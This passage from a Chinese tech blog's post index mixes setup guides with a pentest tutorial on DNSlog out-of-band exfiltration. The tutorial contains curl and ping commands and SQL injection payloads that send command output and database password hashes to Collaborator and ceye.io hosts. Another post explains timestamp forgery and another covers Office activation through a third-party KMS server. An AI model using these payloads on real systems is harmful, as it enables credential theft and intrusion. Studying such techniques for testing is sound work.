[{"content":"初始化项目 npm create vue@latest . 安装 primevue 及其相关组件 npm install primevue primeicons npm install @primevue/themes 安装自动导入插件 npm install unplugin-vue-components -D npm install @primevue/auto-import-resolver -D 安装 tailwindcss npm install tailwindcss-primeui npm install tailwindcss @tailwindcss/vite src/main.js 配置 import { createApp } from \u0026#34;vue\u0026#34;; import App from \u0026#34;./App.vue\u0026#34;; import PrimeVue from \u0026#34;primevue/config\u0026#34;; import Aura from \u0026#34;@primevue/themes/aura\u0026#34;; import \u0026#34;primeicons/primeicons.css\u0026#34;; const app = createApp(App); app.use(router); app.use(PrimeVue, { theme: { preset: Aura, options: { // 深色模式开关 darkModeSelector: false, }, }, }); app.mount(\u0026#34;#app\u0026#34;); src/style.css 配置 /* 导入tailwindcss */ @import \u0026#34;tailwindcss\u0026#34;; @import \u0026#34;tailwindcss-primeui\u0026#34;; index.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;icon\u0026#34; href=\u0026#34;/favicon.ico\u0026#34; /\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34; /\u0026gt; \u0026lt;!-- 加载css，使style.css中导入的tailwindcss生效 --\u0026gt; \u0026lt;link href=\u0026#34;/src/style.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;Vite App\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;module\u0026#34; src=\u0026#34;/src/main.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; vite.config.js 配置 import { fileURLToPath, URL } from \u0026#34;node:url\u0026#34;; import vue from \u0026#34;@vitejs/plugin-vue\u0026#34;; import { defineConfig } from \u0026#34;vite\u0026#34;; // 导入tailwindcss import tailwindcss from \u0026#34;@tailwindcss/vite\u0026#34;; // 导入自动导入插件 import Components from \u0026#34;unplugin-vue-components/vite\u0026#34;; import { PrimeVueResolver } from \u0026#34;@primevue/auto-import-resolver\u0026#34;; // https://vite.dev/config/ export default defineConfig({ plugins: [ vue(), // 加载tailwindcss tailwindcss(), Components({ // 自动导入组件 resolvers: [PrimeVueResolver()], }), ], resolve: { alias: { \u0026#34;@\u0026#34;: fileURLToPath(new URL(\u0026#34;./src\u0026#34;, import.meta.url)), }, }, }); ","date":"2025-09-12T14:30:00+08:00","permalink":"https://runshell.github.io/post/web%E5%BC%80%E5%8F%91/primevuev4+tailwindv4%E9%85%8D%E7%BD%AE/","title":"PrimevueV4+TailwindV4配置"},{"content":"创建聚合组 # lacp 逐流负载 nmcli connection add type team con-name team0 ifname team0 config \u0026#39;{\u0026#34;runner\u0026#34;: {\u0026#34;name\u0026#34;: \u0026#34;lacp\u0026#34;, \u0026#34;tx_hash\u0026#34;: [\u0026#34;eth\u0026#34;, \u0026#34;ipv4\u0026#34;, \u0026#34;tcp\u0026#34;, \u0026#34;udp\u0026#34;]}}\u0026#39; 配置聚合组 # 将接口eno2和eno3添加到聚合组team0中 nmcli connection add type team-slave con-name team0-port1 ifname eno2 master team0 nmcli connection add type team-slave con-name team0-port2 ifname eno3 master team0 配置 IP 地址 # 根据实际情况配置IP，配置静态IP nmcli connection modify team0 ipv4.addresses 192.168.2.2/24 nmcli connection modify team0 ipv4.method manual # 配置自动获取 # nmcli connection modify team0 ipv4.method auto 启动聚合组 nmcli connection up team0 nmcli connection up team0-port1 nmcli connection up team0-port2 设置 team0 连接为开机自动激活 nmcli connection modify team0 connection.autoconnect yes nmcli connection modify team0-port1 connection.autoconnect yes nmcli connection modify team0-port2 connection.autoconnect yes ","date":"2025-05-06T10:58:00+08:00","permalink":"https://runshell.github.io/post/%E5%9F%BA%E7%A1%80%E8%BF%90%E7%BB%B4/rhel-8.10%E7%AB%AF%E5%8F%A3%E8%81%9A%E5%90%88/","title":"RHEL 8.10端口聚合"},{"content":"下载 以下地址非官网地址，但下载地址为官网地址，可放心下载。选择适合的语言和版本。\nhttps://gravesoft.dev/office_c2r_links#chinese-simplified-zh-cn 安装 解压或挂载后，运行setup.exe或Office\\Setup64.exe，等待安装完成。\n激活 转换 将 office 转换成 vol 版本，才可使用 kms 激活。以管理员身份打开命令行(cmd非powershell)，执行：\n@rem 进入office ospp.vbs文件所在目录 cd \u0026#34;C:\\Program Files\\Microsoft Office\\Office16\u0026#34; || cd \u0026#34;C:\\Program Files (x86)\\Microsoft Office\\Office16\u0026#34; @rem ProPlus2024为office版本，修改为你需要激活的版本即可，有哪些版本可查看..\\root\\Licenses16 目录 for %x in (dir /b ..\\root\\Licenses16\\ProPlus2024VL_*.xrm-ms) do cscript ospp.vbs /inslic:\u0026#34;%x\u0026#34; gvlk 从微软官方文档中获取对应版本的产品密钥，用于下一步激活\nhttps://learn.microsoft.com/zh-cn/office/volume-license-activation/gvlks kms 激活 @rem 注意跟换XJ2XN-FW8RK-P4HMP-DKDBV-GCVGB为上一步查询到的key cscript ospp.vbs /inpkey:XJ2XN-FW8RK-P4HMP-DKDBV-GCVGB @rem 设置kms服务器，此处以kms.03k.org为例 cscript ospp.vbs /sethst:kms.03k.org @rem 激活 cscript ospp.vbs /act ","date":"2025-05-05T14:30:00+08:00","permalink":"https://runshell.github.io/post/%E5%9F%BA%E7%A1%80%E8%BF%90%E7%BB%B4/office-%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85%E6%BF%80%E6%B4%BB/","title":"office 下载安装激活"},{"content":"下载包 wget https://mirror.ghproxy.com/https://github.com/arkime/arkime/releases/download/v4.3.0/arkime-4.3.0-1.el9.x86_64.rpm 安装依赖 yum install -y perl-libwww-perl perl-JSON perl-LWP-Protocol-https 安装 arkime rpm -i arkime-4.3.0-1.el9.x86_64.rpm 阅读 readme cat /opt/arkime/README.txt 查看网卡，清楚管理口网卡和用于接收镜像的网卡 ifconfig 执行配置脚本进行交互式配置 根据提示选择镜像网卡，输入密码等。配置过程会自动安装 elasticsearch，如果是内网机需手动安装，elasticsearch 可自行安装，本机部署建议监听 127.0.0.1\n/opt/arkime/bin/Configure 启动服务 systemctl start elasticsearch.service # 开机自启 systemctl enable elasticsearch.service netstat -lnp | grep 9200 初始化 elasticsearch /opt/arkime/db/db.pl http://127.0.0.1:9200 init 添加 web 管理员账号 /opt/arkime/bin/arkime_add_user.sh cbtdadmin \u0026#34;Admin User\u0026#34; fuzak0uling --admin 启动服务 systemctl start arkimecapture.service systemctl start arkimeviewer.service systemctl enable arkimecapture.service systemctl enable arkimeviewer.service netstat -lnp | grep 8005 出现 bug 查看日志 cat /opt/arkime/logs/viewer.log cat /opt/arkime/logs/capture.log # 出现 bug 查看 seLinux 开关 getenforce # 主机防火墙配置 firewall-cmd --add-rich-rule=\u0026#39;rule family=\u0026#34;ipv4\u0026#34; source address=\u0026#34;10.x.x.x\u0026#34; port port=8005 protocol=\u0026#34;tcp\u0026#34; accept\u0026#39; firewall-cmd --runtime-to-permanent 可能缺失的文件 国内访问需要使用镜像站 wget \u0026#34; https://mirror.ghproxy.com/https://raw.githubusercontent.com/wireshark/wireshark/master/manuf\u0026#34; mv manuf /opt/arkime/etc/oui.txt 通常无需访问镜像站 wget \u0026#34;https://www.iana.org/assignments/ipv4-address-space/ipv4-address-space.csv\u0026#34; vi /opt/arkime/bin/arkime_update_geo.sh mv ipv4-address-space.csv /opt/arkime/etc/ systemctl restart arkimecapture.service 优化配置 清理 60 天以前的流量日志 crontab -e 0 0 * * * /opt/arkime/db/db.pl 127.0.0.1:9200 expire daily 60 配置 elasticsearch 水位线 curl -X PUT \u0026#34;http://127.0.0.1:9200/_cluster/settings?pretty\u0026#34; -H \u0026#39;Content-Type: application/json\u0026#39; -d\u0026#39; { \u0026#34;persistent\u0026#34;: { \u0026#34;cluster.routing.allocation.disk.watermark.low\u0026#34;: \u0026#34;90gb\u0026#34;, \u0026#34;cluster.routing.allocation.disk.watermark.high\u0026#34;: \u0026#34;50gb\u0026#34;, \u0026#34;cluster.routing.allocation.disk.watermark.flood_stage\u0026#34;: \u0026#34;10gb\u0026#34;, \u0026#34;cluster.info.update.interval\u0026#34;: \u0026#34;1m\u0026#34; } }\u0026#39; 配置删除 pcap 包保证空闲磁盘空间 vi /opt/arkime/etc/config.ini freeSpaceG=200 ","date":"2024-07-15T14:30:00+08:00","image":"https://runshell.github.io/images/Arkime_Logo.png","permalink":"https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/centos-stream9%E5%AE%89%E8%A3%85arkime/","title":"Centos Stream9安装Arkime"},{"content":" powershell 使用Set-ItemProperty来修改文件属性，-name参数指定属性名，-value参数指定参数值。时间格式为2018-08-25 15:23:36,如果选用当前时间可直接使用命令date代替时间。\nPS C:\\Users\\HUAWEI\\Desktop\u0026gt; Get-ItemProperty -Path .\\1.jsp | fl Name : 1.jsp Length : 2598 CreationTime : 2020/8/24 14:29:10 LastWriteTime : 2020/8/24 14:29:10 LastAccessTime : 2020/11/6 14:54:12 Mode : -a---- LinkType : Target : {} VersionInfo : File: C:\\Users\\HUAWEI\\Desktop\\1.jsp InternalName: OriginalFilename: FileVersion: FileDescription: Product: ProductVersion: Debug: False Patched: False PreRelease: False PrivateBuild: False SpecialBuild: False Language: PS C:\\Users\\HUAWEI\\Desktop\u0026gt; Set-ItemProperty -Path .\\1.jsp -Name CreationTime -Value \u0026#39;2020年11月6日 14:56:25\u0026#39; PS C:\\Users\\HUAWEI\\Desktop\u0026gt; Get-ItemProperty -Path .\\1.jsp | fl 目录: C:\\Users\\HUAWEI\\Desktop Name : 1.jsp Length : 2598 CreationTime : 2020/11/6 14:56:25 LastWriteTime : 2020/8/24 14:29:10 LastAccessTime : 2020/11/6 14:57:36 Mode : -a---- LinkType : Target : {} VersionInfo : File: C:\\Users\\HUAWEI\\Desktop\\1.jsp InternalName: OriginalFilename: FileVersion: FileDescription: Product: ProductVersion: Debug: False Patched: False PreRelease: False PrivateBuild: False SpecialBuild: False Language: PS C:\\Users\\HUAWEI\\Desktop\u0026gt; c/c++ 在不了解powershell的时候，没有找到很好的工具来修改文件时间戳，于是有了下面的代码，用户交互上完全模仿linux中的touch。所以用法和linux中touch相同。\n该程序本质是调用SetFileTime(f,ct,at,mt)函数修改时间戳，一大把的代码都在做参数解析，真正实现修改时间戳的就这一个函数。\nwtouch.cpp⬇ wtouch.exe\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; using namespace std; int main(int argc,char *argv[]) { string inputtime,rfile,file; string help=\u0026#34;用法：wtouch [选项]... 文件...\\n\u0026#34; \u0026#34;更新文件的访问时间、修改时间和创建时间为当前时间。\\n\u0026#34; \u0026#34;如果文件不存在将创建一个空文件，除非提供了-c参数\\n\\n\\n\u0026#34; \u0026#34;通过使用一些特定的参数对文件时间做相应的修改。\\n\\n\u0026#34; \u0026#34; -a 只更改访问时间\\n\u0026#34; \u0026#34; -c 只更改创建时间\\n\u0026#34; \u0026#34; -m 只更改修改时间\\n\u0026#34; \u0026#34; -n, --no-create 不创建任何文件\\n\u0026#34; \u0026#34; -r, --reference=FILE 使用这个文件的时间而不是当前时间\\n\u0026#34; \u0026#34; -t STAMP 使用[YYYY]MMDDhhmm[.ss]而非当前时间\\n\u0026#34; \u0026#34; -h, --help 显示此帮助信息并退出\\n\\n\u0026#34; \u0026#34;请注意，-d 和-t 选项可接受不同的时间/日期格式。\\n\u0026#34;; FILETIME ctim,atim,mtim; FILETIME *ct; FILETIME *mt; FILETIME *at; SYSTEMTIME systime; HANDLE rf,f; int i; bool m=true,a=true,c=true,n=true; if(argc==1) { cout\u0026lt;\u0026lt;help; return 0; } for(i=1;i\u0026lt;argc;i++) { if(argv[i]==string(\u0026#34;-m\u0026#34;)) {a=false;c=false;} else if(argv[i]==string(\u0026#34;-c\u0026#34;)) {a=false;m=false;} else if(argv[i]==string(\u0026#34;-a\u0026#34;)) {m=false;c=false;} else if(argv[i]==string(\u0026#34;-acm\u0026#34;)|| argv[i]==string(\u0026#34;-cam\u0026#34;)|| argv[i]==string(\u0026#34;-cma\u0026#34;)|| argv[i]==string(\u0026#34;-amc\u0026#34;)|| argv[i]==string(\u0026#34;-mac\u0026#34;)|| argv[i]==string(\u0026#34;-mca\u0026#34;)) {m=true;a=true;c=true;} else if(argv[i]==string(\u0026#34;-cm\u0026#34;)||argv[i]==string(\u0026#34;-mc\u0026#34;)) a=false; else if(argv[i]==string(\u0026#34;-ac\u0026#34;)||argv[i]==string(\u0026#34;-ca\u0026#34;)) m=false; else if(argv[i]==string(\u0026#34;-am\u0026#34;)||argv[i]==string(\u0026#34;-ma\u0026#34;)) c=false; else if(argv[i]==string(\u0026#34;-n\u0026#34;)||argv[i]==string(\u0026#34;--no-create\u0026#34;)) n=true; else if(argv[i]==string(\u0026#34;--reference\u0026#34;)||argv[i]==string(\u0026#34;-r\u0026#34;)) rfile=argv[++i]; else if(argv[i]==string(\u0026#34;-t\u0026#34;)) inputtime=argv[++i]; else if(argv[i]==string(\u0026#34;--help\u0026#34;)||argv[i]==string(\u0026#34;-h\u0026#34;)) cout\u0026lt;\u0026lt;help; else file=argv[i]; } //获取当前时间 GetLocalTime(\u0026amp;systime); //从-t获取时间覆盖当前时间 if(inputtime.length()!=0) { i=inputtime.length()-1; if(inputtime[i-2]==\u0026#39;.\u0026#39;) { systime.wSecond=atoi(inputtime.substr(i-1,2).c_str()); i-=3; } else systime.wSecond=0; if(i\u0026gt;0) { systime.wMinute=atoi(inputtime.substr(i-1,2).c_str()); i-=2; } else return 0; if(i\u0026gt;0) { systime.wHour=atoi(inputtime.substr(i-1,2).c_str()); i-=2; } else return 0; if(i\u0026gt;0) { systime.wDay=atoi(inputtime.substr(i-1,2).c_str()); i-=2; } if(i\u0026gt;0) { systime.wMonth=atoi(inputtime.substr(i-1,2).c_str()); i-=4; } if(i\u0026gt;0) { systime.wYear=atoi(inputtime.substr(i-1,4).c_str()); } } SystemTimeToFileTime(\u0026amp;systime,\u0026amp;ctim); LocalFileTimeToFileTime(\u0026amp;ctim,\u0026amp;atim); ctim=atim;mtim=atim; //从参照文件获得文件时间 if(rfile.length()!=0) { rf=CreateFileA(rfile.c_str(),GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,NULL); if(rf==INVALID_HANDLE_VALUE) { cout\u0026lt;\u0026lt;\u0026#34;打开参照文件失败！\u0026#34;; return 0; } if(!GetFileTime(rf,\u0026amp;ctim,\u0026amp;atim,\u0026amp;mtim)) { cout\u0026lt;\u0026lt;\u0026#34;获取参照文件时间信息失败！\u0026#34;; CloseHandle(rf); return 0; } CloseHandle(rf); } //i暂时用作dwCreationDisposition if(n) i=OPEN_EXISTING;//不创建新文件 else i=OPEN_ALWAYS;//文件不存在时新建空文件 f=CreateFileA(file.c_str(),GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,i, FILE_ATTRIBUTE_NORMAL,NULL); if(f==INVALID_HANDLE_VALUE) { cout\u0026lt;\u0026lt;\u0026#34;打开文件失败！\u0026#34;; return 0; } ct=\u0026amp;ctim;mt=\u0026amp;mtim;at=\u0026amp;atim; if(!m) mt=NULL; if(!c) ct=NULL; if(!a) at=NULL; if(!SetFileTime(f,ct,at,mt)) cout\u0026lt;\u0026lt;\u0026#34;修改失败！\u0026#34;; CloseHandle(f); return 0; } ","date":"2020-07-15T14:30:00+08:00","permalink":"https://runshell.github.io/post/%E5%9F%BA%E7%A1%80%E8%BF%90%E7%BB%B4/windows%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6%E6%97%B6%E9%97%B4%E6%88%B3/","title":"windows修改文件时间戳"},{"content":"1. 安装（略） 程序安装包 HP_LoadRunner_12.02_Community_Edition_T7177-15059.exe\n语言包 HP_LoadRunner_12.02_Community_Edition_Language_Packs_T7177-15062.exe\n2. 使用简介 ​\t安装完成后，桌面上新增3个图标，分别是Virtual User Generator、 Controller 、Analysis 。\n2.1 录制脚本 ​\t打开Virtual User Generator ，使用组合键Ctrl+N打开如下对话框，选择单协议→Web-HTTP/HTML，填写脚本名称和保存位置后，点击创建。\n创建后到达如下界面，可以发先操作分3类，分别为vuser_init、Action、vuser_end。他们的区别在于vuser_init只运行一次，在启动运行场景后最先运行；在vuser_init部分运行完后，Action根据运行场景的设置，多次并发运行；Action运行结束后，运行场景结束前运行vuser_end，也只运行一次。通常来说，vuser_init录制登录操作，Action部分录制需要测试并发的业务操作，vuser_end部分录制最后登出注销之类的释放资源的操作。\n​\t录制vuser_init：选中vuser_init，按组合键Ctrl+R打开如下对话框，配置好url等相关参数后点击开始录制。Loadrunner会自动打开您选择的浏览器并访问您指定的URL。\n【注】如果出现下图错误，请确认网络是否正常，网络正常即可忽略该错误。\n​\t输入用户名密码进行正常登录，\n​\t登录完成后，将操作切换为Action，继续进行收件操作，如果还想测试其它事件场景，点击右侧加号，添加新的事件场景。需要测试的场景录制完成后，将操作切换至vuser_end，录制注销操作。录制完成后点击终止按钮结束录制。\n2.2 运行脚本 ​\t录制完成后打开Controller，选中刚才录制的脚本，点击添加，然后点击确定按钮，进入场景配置界面。\n2.2.1 场景配置 ​\t加载生成器，由于Virtual User Generator与Controller在同一计算机，所以添加一个localhost的生成器，确定即可。\n​\t配置全局计划，配置初始化方式、启动的vuser个数以及启动的时间、测试持续时间等。\n2.2.2 监视服务器资源 ​\t点击底部的运行标签，切换至如下界面，根据服务器操作系统类型，选择Windows资源或UNIX资源，右击最右下角的统计图，在右击菜单中选择添加度量，到达服务器信息配置界面。\n2.2.2.1 Linux 在Linux服务器上安装并启动rstatd apt-get install rstatd#安装rstatd service rpcbind start #启动rpc服务 rpc.rstatd\t#启动rpc.rstatd服务 rpcinfo -p\t#查看服务状态和端口 在Controller中添加资源视图，添加时，注意带上rstatd服务所监听的端口。 2.2.2.2 Windows 确保机器B的Remote ProcedureCall(RPC)和Remote Registry Service服务开启。 确保C盘默认共享开启。 添加主机，输入用户名密码，用户必须为administrator或同权限用户。 点击确定片刻后出现数据，表明资源监控配置成功。 2.2.3 开始场景 ​\t一切就绪，点击开始场景开始运行，等待测试结束。\n2.3 结果分析 ​\t场景测试完成后，点击如下图标，将打开Analysis，自动分析统计测试产生的数据。\n​\tAnalysis打开后的界面如下，默认展示的统计图不包含系统资源的统计图。\n​\t按下组合键Ctrl+A来添加统计图\n【参考链接】 LoadRunner11实操压力测试\nloadrunner监控linux服务器\nloadrunner监控Windows服务器\n","date":"2019-07-15T14:30:00+08:00","image":"https://runshell.github.io/images/operate.png","permalink":"https://runshell.github.io/post/%E5%9F%BA%E7%A1%80%E8%BF%90%E7%BB%B4/loadrunner12-%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/","title":"Loadrunner12 使用基础教程"},{"content":"[注]本文提到的 burp 均为付费专业版，免费社区版不具有该功能。\n0x00 什么是 dnslog dnslog，顾名思义，就是 dns 服务产生的日志。有什么用呢？我们可以用子域名来携带出信息。\n这种套路主要用于渗透测试中的盲打。执行系统命令没有回显的时候，sql 盲注的时候，xss 想将 cookie 带出来的时候……将你想得到的信息放在自己的域名前面作为子域名，dns 服务器解析该域名时产生的日志中将会包含整个域名。如果携带的信息太长，可能 dns 就携带不了了，好在通常 dnslog 平台同时也提供 http 日志，可以使用 http 请求携带更多信息。\n0x01 burp suite 中的 dnslog 功能 Collaborator client ，相比 Burp 中的proxy、instruder、scanner等功能，这个功能可能鲜为人知了吧！启动位置如下图，Butp→Burp Collaborator client。\n启动 Collaborator client 后显示如下页面，burp 会分配给我们一个三级域名，点击Copy to clipbord可以将域名复制到粘贴板，如p1rf8orun99jx1pa9ayqx55quh07ow.burpcollaborator.net 。\n下面举个简单的例子，在 Linux shell 中执行如下命令：\nping `whoami`.p1rf8orun99jx1pa9ayqx55quh07ow.burpcollaborator.net 点击 Collaborator client 窗口中的 Poll now 获取 dnslog，如下图，在 log 条目区域显示两条日志，在下面的日志详情中我们看到了从子域名中携带出了whoami的执行结果。\n如果想执行 ls 查看根目录有哪些文件，用 dns 携带不了那么多信息，转而使用 http 请求，执行如下命令：\ncurl p1rf8orun99jx1pa9ayqx55quh07ow.burpcollaborator.net -d \u0026#34;`ls -al /`\u0026#34; 再次点击 Collaborator client 窗口中的 Poll now 获取 log，我们可以在 log 区看到一条 http 日志，我们查看请求原始信息可以看到请求体中携带出了ls -al /的执行结果。\n有没有觉得明文携带这些信息太不安全了？可是使用 https 安全传送，例如：\ncurl https://p1rf8orun99jx1pa9ayqx55quh07ow.burpcollaborator.net -d \u0026#34;`ls -al /`\u0026#34; 最后的结果和使用 http 一样。burp 的 dnslog 功能也是相当全的。\n0x02 私有的 Collaborator server 上面举例的是使用 burp 的公共 Collaborator server，有时我们需要使用私有的 Collaborator server。使用公共的 Collaborator server，但是，信息存储在别人的服务器上是没有保密性可言的。还有一种情况，就是需要渗透的目标在内网且不与外网互通的情况下，就得使用私有的 Collaborator server。 下面我们来看看如何搭建私有的 Collaborator server。burp 提供了搭建 Collaborator server 的功能，在服务器上执行sudo java -jar burp.jar --collaborator-server 即带--collaborator-server参数运行 burp 即可启动服务。 然后在客户端配置，以此打开Project options→Misc→Burp Collaborator server ，选择Use a private Collaborator server ，在Server location中设置服务器域名，没有域名的情况下可以使用 IP，如果按 IP 地址指定服务器，则无法使用依赖于 DNS 解析的 Burp 与 Collaborator 相关的功能。 另外，默认情况下，Burp 通过 HTTPS 轮询 Collaborator 服务器，并强制实施 SSL 信任以防止中间人攻击。如果您的 Burp 实例由于网络或其他限制而无法通过 HTTPS 直接轮询，您可以选择轮询未加密的 HTTP。由于没有配置 ssl 证书，所以此处勾选Poll over unencrypted HTTP即使用未加密的 http 轮询。详情如下图：\n最后，我们点击Run health check...进行检查，发现部分可功能不可用，如下图：\n幸运的是，已经可以使用 http 请求了，使用方法和使用公共 Collaborator server 时一样，参见本文[0x01]。若要充分利用 Collaborator 服务器的功能，通常还需要创建合适的配置文件。 以下配置相关类容来自 burp 官网，然后机翻的结果：\n协作者配置文件格式 Burp Collaborator 服务器的所有选项均使用配置文件进行控制。默认情况下，Collaborator 服务器 在当前工作目录中查找名为 collaborator.config 的文件 。可以使用\u0026ndash;collaborator-config 参数从命令行覆盖此位置 ，例如:\nsudo java -jar burp.jar --collaborator-server --collaborator-config = myconfig.config\n配置文件使用 JSON 格式，支持注释。如果需要 IP 地址，您可以配置单个地址或地址列表。例如，以下任一项都可用于配置网络接口的本地地址:\n\u0026quot;localAddress\u0026quot;:\u0026quot;10.20.0.159\u0026quot; \u0026gt;\u0026quot;localAddress\u0026quot;:[\u0026quot;10.20.0.159\u0026quot;，\u0026quot;127.0.0.1\u0026quot;]\n完整的示例配置文件以及每个可用选项的说明如下所示:\n{ \u0026#34;serverDomain\u0026#34;: \u0026#34;burpcollaborator.example.com\u0026#34;, \u0026#34;workerThreads\u0026#34;: 10, \u0026#34;eventCapture\u0026#34;: { \u0026#34;localAddress\u0026#34;: [\u0026#34;10.20.0.159\u0026#34;, \u0026#34;127.0.0.1\u0026#34;], \u0026#34;publicAddress\u0026#34;: \u0026#34;10.20.0.159 \u0026#34;, \u0026#34;http\u0026#34;: { \u0026#34;ports\u0026#34;: 80 }, \u0026#34;https\u0026#34;: { \u0026#34;ports\u0026#34;: 443 }, \u0026#34;smtp\u0026#34;: { \u0026#34;ports\u0026#34;: [25, 587] }, \u0026#34;smtps\u0026#34;: { \u0026#34;ports\u0026#34;: 465 }, \u0026#34;ssl\u0026#34;: { \u0026#34;certificateFiles\u0026#34;: [ \u0026#34;keys / burpcollaborator.example.com.key.pkcs8\u0026#34;, \u0026#34;keys / burpcollaborator.example.com.crt\u0026#34;, \u0026#34;keys / intermediate.crt\u0026#34; ] } }, \u0026#34;polling\u0026#34;: { \u0026#34;localAddress\u0026#34;: \u0026#34;127.0.0.1\u0026#34;, \u0026#34;publicAddress\u0026#34;: \u0026#34;10.20.0.159\u0026#34;, \u0026#34;http \u0026#34;: { \u0026#34;port\u0026#34;: 9090 }, \u0026#34;https\u0026#34;: { \u0026#34;port\u0026#34;: 9443 }, \u0026#34;ssl\u0026#34;: { \u0026#34;hostname\u0026#34;: \u0026#34;collaboratorpolling.example.com\u0026#34; } }, \u0026#34;metrics\u0026#34;: { \u0026#34;path\u0026#34;: \u0026#34;jnaicmez8\u0026#34;, \u0026#34;addressWhitelist\u0026#34;: [\u0026#34;21.10.23.0/24\u0026#34;] }, \u0026#34;dns\u0026#34;: { \u0026#34;interfaces\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;ns1\u0026#34;, \u0026#34;localAddress\u0026#34;: \u0026#34;34.23.11.6\u0026#34;, \u0026#34;publicAddress\u0026#34;: \u0026#34;98.87.76.55\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;ns2\u0026#34;, \u0026#34;localAddress\u0026#34;: \u0026#34;34.23 .11.6\u0026#34;, \u0026#34;publicAddress\u0026#34;: \u0026#34;98.87.11.00\u0026#34; } ], \u0026#34;ports\u0026#34;: 53 }, \u0026#34;logLevel\u0026#34;: \u0026#34;INFO\u0026#34; } SERVERDOMAIN Collaborator 服务器将控制 DNS 的域或子域。DNS 功能需要此设置。 workerThreads Collaborator 用于处理传入请求的线程数。 eventCapture.localAddress 默认情况下，Collaborator 将侦听所有本地接口以捕获交互事件。如果指定，它将仅侦听已配置的接口。 eventCapture.publicAddress 用于捕获交互事件的公共 IP 地址。 eventCapture.http.ports 用于侦听 HTTP 交互事件的端口。如果正在转发端口 80，则只应从默认值更改。 eventCapture.https.ports 用于侦听 HTTPS 交互事件的端口。如果正在转发端口 443，则只应从默认值更改。 eventCapture.smtp.ports 用于侦听 SMTP 交互事件的端口。如果正在转发端口 25 和 587，则只应从默认值更改。 eventCapture.smtps.ports 用于侦听 SMTPS 交互事件的端口。如果正在转发端口 465，则只应从默认值更改。 eventCapture.https.hostname 用于生成自签名证书。有关详细信息，请参阅SSL 配置。 polling.localAddress 默认情况下，Collaborator 将使用相同的网络接口捕获交互事件和提供轮询请求。如果指定，它将使用不同的接口来轮询请求。 polling.publicAddress 用于提供轮询请求的公共地址。 polling.http.port 用于通过 HTTP 轮询的端口。这可能是非标准的，需要配置 Burp Suite 才能使用它。 polling.https.port 用于通过 HTTPS 轮询的端口。这可能是非标准的，需要配置 Burp Suite 才能使用它。 polling.https.hostname 用于生成自签名证书。有关详细信息，请参阅SSL 配置。 metrics.path 可以访问度量标准页面的 URL 路径。 metrics.whitelist 允许访问指标页面的客户端 IP 地址白名单。 dns.ports 用于侦听 DNS 查询的端口。如果正在转发端口 53，则只应从默认值更改。 dns.interfaces 用于侦听 DNS 查询的本地接口列表。如果您的注册商要求您为每个权威名称服务器配置不同的 IP 地址，则可以使用多个网络接口并使用此选项配置其位置。 dns.interfaces.name 用于在此接口上运行的名称服务器的主机名。每个名称服务器应使用不同的主机名（例如 ns1，ns2 等）。 dns.interfaces.localAddress 要绑定到此名称服务器的本地地址。 dns.interfaces.publicAddress 与配置的本地地址对应的公共 IP 地址。通常，您需要在域的 DNS 记录中使用配置的主机名和公共 IP 地址。 LOGLEVEL 标准输出所需 的日志记录级别。 0x03 dnslog 的更多骚操作 以下内容来自 dnslog 开放平台ceye.io。\n0x00 Command Execution i. *nix: curl http://ip.port.b182oj.ceye.io/`whoami` ping `whoami`.ip.port.b182oj.ceye.io ii. windows ping %USERNAME%.b182oj.ceye.io 0x01 SQL Injection i. SQL Server DECLARE @host varchar(1024); SELECT @host=(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name=\u0026#39;sa\u0026#39;) +\u0026#39;.ip.port.b182oj.ceye.io\u0026#39;; EXEC(\u0026#39;master..xp_dirtree \u0026#34;\\\\\u0026#39;+@host+\u0026#39;\\foobar$\u0026#34;\u0026#39;); ii. Oracle SELECT UTL_INADDR.GET_HOST_ADDRESS(\u0026#39;ip.port.b182oj.ceye.io\u0026#39;); SELECT UTL_HTTP.REQUEST(\u0026#39;http://ip.port.b182oj.ceye.io/oracle\u0026#39;) FROM DUAL; SELECT HTTPURITYPE(\u0026#39;http://ip.port.b182oj.ceye.io/oracle\u0026#39;).GETCLOB() FROM DUAL; SELECT DBMS_LDAP.INIT((\u0026#39;oracle.ip.port.b182oj.ceye.io\u0026#39;,80) FROM DUAL; SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name=\u0026#39;SYS\u0026#39;)||\u0026#39;.ip.port.b182oj.ceye.io\u0026#39;,80) FROM DUAL; iii. MySQL SELECT LOAD_FILE(CONCAT(\u0026#39;\\\\\\\\\u0026#39;,(SELECT password FROM mysql.user WHERE user=\u0026#39;root\u0026#39; LIMIT 1),\u0026#39;.mysql.ip.port.b182oj.ceye.io\\\\abc\u0026#39;)); iv. PostgreSQL DROP TABLE IF EXISTS table_output; CREATE TABLE table_output(content text); CREATE OR REPLACE FUNCTION temp_function() RETURNS VOID AS $ DECLARE exec_cmd TEXT; DECLARE query_result TEXT; BEGIN SELECT INTO query_result (SELECT passwd FROM pg_shadow WHERE usename=\u0026#39;postgres\u0026#39;); exec_cmd := E\u0026#39;COPY table_output(content) FROM 